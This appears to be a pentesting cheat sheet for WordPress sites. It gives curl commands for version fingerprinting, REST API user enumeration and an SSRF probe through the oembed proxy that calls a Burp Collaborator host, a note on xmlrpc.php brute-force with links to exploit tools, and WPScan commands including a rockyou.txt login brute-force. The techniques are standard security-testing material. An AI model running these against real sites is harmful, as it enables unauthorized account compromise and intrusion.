# Information Gathering

## Key Files and Directories to Check

- `license.txt`
- `wp-activate.php`
- `wp-content/uploads/`
- `wp-includes/`
- `wp-config.php`

## Identifying WordPress Version

### Checking `license.txt`
The `license.txt` file can sometimes provide version information.

### Using curl to Check the WordPress Version
```bash
curl https://victim.com/ | grep 'content="WordPress'
```

## Enumerating Users
### Checking for Usernames
WordPress exposes usernames through the REST API endpoint:
```bash
curl https://victim.com/wp-json/wp/v2/users
```

### Checking for IP Leaks
Pages endpoint can leak IP addresses:
```bash
curl https://victim.com/wp-json/wp/v2/pages
```

### Check Author IDs
You can enumerate author IDs and usernames using:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```

## xmlrpc.php

### Checking if xmlrpc.php is Active
The `xmlrpc.php` file can be used for credential brute-force or DoS attacks. 

### Exploiting xmlrpc.php
There are various tools and scripts available to exploit `xmlrpc.php`, such as:
- [WPXploit](https://github.com/relarizky/wpxploit)
- [Nitescu Lucian's Guide](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

## Server-Side Request Forgery (SSRF)

### Checking SSRF via oembed Proxy
The endpoint `/wp-json/oembed/1.0/proxy` can be used for SSRF attacks.

### Testing SSRF
```bash
curl https://wordpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net
```

# WPScan

WPScan is a WordPress security scanner designed for security professionals and site maintainers to test the security of WordPress websites.

## Installation
You can clone the WPScan repository and install it via gem:
```bash
git clone https://github.com/wpscanteam/wpscan
cd wpscan
sudo gem install bundler && bundle install --without test
```
## Basic Commands

### Enumerate Plugins with Known Vulnerabilities
```bash
wpscan --url example.com -e vp --plugins-detection mixed --api-token YOUR_TOKEN
```
### Enumerate All Plugins in WPScan Database
```bash
wpscan --url example.com -e ap --plugins-detection mixed --api-token YOUR_TOKEN
```
### Default Command with API Token
```bash
wpscan --url example.com --ignore-main-redirect --detection-mode aggressive --plugins-detection mixed --api-token YOUR_TOKEN
```
### Bruteforce logins
```bash
wpscan --rua --url example.com -P rockyou.txt
```